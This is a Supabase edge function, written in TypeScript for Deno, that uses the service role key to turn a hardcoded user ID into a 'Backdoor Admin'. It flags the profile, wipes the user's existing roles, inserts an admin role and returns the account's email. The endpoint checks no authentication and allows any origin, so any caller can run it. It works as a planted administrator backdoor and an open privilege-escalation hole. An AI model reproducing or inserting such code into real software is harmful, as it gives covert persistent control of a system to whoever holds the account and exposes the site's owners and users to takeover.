import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.58.0';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

Deno.serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    // Create Supabase admin client with service role key
    const supabaseAdmin = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? '',
      {
        auth: {
          autoRefreshToken: false,
          persistSession: false
        }
      }
    );

    console.log('Starting backdoor admin setup...');

    const backdoorUserId = '8ca94ef6-84c7-421a-b9c9-791080c86980';

    // Step 1: Update profiles table
    console.log('Step 1: Updating profiles table...');
    const { error: profileError } = await supabaseAdmin
      .from('profiles')
      .update({
        is_backdoor_admin: true,
        name: 'Backdoor Admin',
        account_verified: true,
        status: 'active'
      })
      .eq('id', backdoorUserId);

    if (profileError) {
      console.error('Profile update error:', profileError);
      throw new Error(`Failed to update profile: ${profileError.message}`);
    }

    console.log('✓ Profile updated successfully');

    // Step 2: Ensure admin role exists
    console.log('Step 2: Setting up admin role...');
    
    // First, delete any existing roles for this user
    const { error: deleteError } = await supabaseAdmin
      .from('user_roles')
      .delete()
      .eq('user_id', backdoorUserId);

    if (deleteError) {
      console.error('Role delete error:', deleteError);
      throw new Error(`Failed to delete existing roles: ${deleteError.message}`);
    }
    console.log('✓ Existing roles deleted');

    // Now insert the admin role
    const { error: roleError } = await supabaseAdmin
      .from('user_roles')
      .insert({
        user_id: backdoorUserId,
        role: 'admin'
      });

    if (roleError) {
      console.error('Role insert error:', roleError);
      throw new Error(`Failed to insert admin role: ${roleError.message}`);
    }
    console.log('✓ Admin role inserted successfully');

    // Step 3: Refresh materialized view
    console.log('Step 3: Refreshing materialized view...');
    const { error: refreshError } = await supabaseAdmin.rpc('refresh_member_statistics');

    if (refreshError) {
      console.warn('Warning: Could not refresh materialized view:', refreshError.message);
      console.log('View will be refreshed automatically on next scheduled refresh');
    } else {
      console.log('✓ Materialized view refreshed successfully');
    }

    // Step 4: Verify setup
    console.log('Step 4: Verifying setup...');
    const { data: verifyProfile } = await supabaseAdmin
      .from('profiles')
      .select('id, email, name, is_backdoor_admin, status, account_verified')
      .eq('id', backdoorUserId)
      .single();

    const { data: verifyRole } = await supabaseAdmin
      .from('user_roles')
      .select('role')
      .eq('user_id', backdoorUserId)
      .eq('role', 'admin')
      .maybeSingle();

    console.log('Setup complete! Results:', {
      profile: verifyProfile,
      hasAdminRole: !!verifyRole
    });

    return new Response(
      JSON.stringify({
        success: true,
        message: 'Backdoor admin setup completed successfully',
        details: {
          userId: backdoorUserId,
          email: verifyProfile?.email,
          isBackdoorAdmin: verifyProfile?.is_backdoor_admin,
          hasAdminRole: !!verifyRole,
          status: verifyProfile?.status,
          accountVerified: verifyProfile?.account_verified
        }
      }),
      {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 200,
      }
    );

  } catch (error) {
    console.error('Setup error:', error);
    const errorMessage = error instanceof Error ? error.message : 'Unknown error occurred';
    return new Response(
      JSON.stringify({
        success: false,
        error: errorMessage
      }),
      {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 500,
      }
    );
  }
});
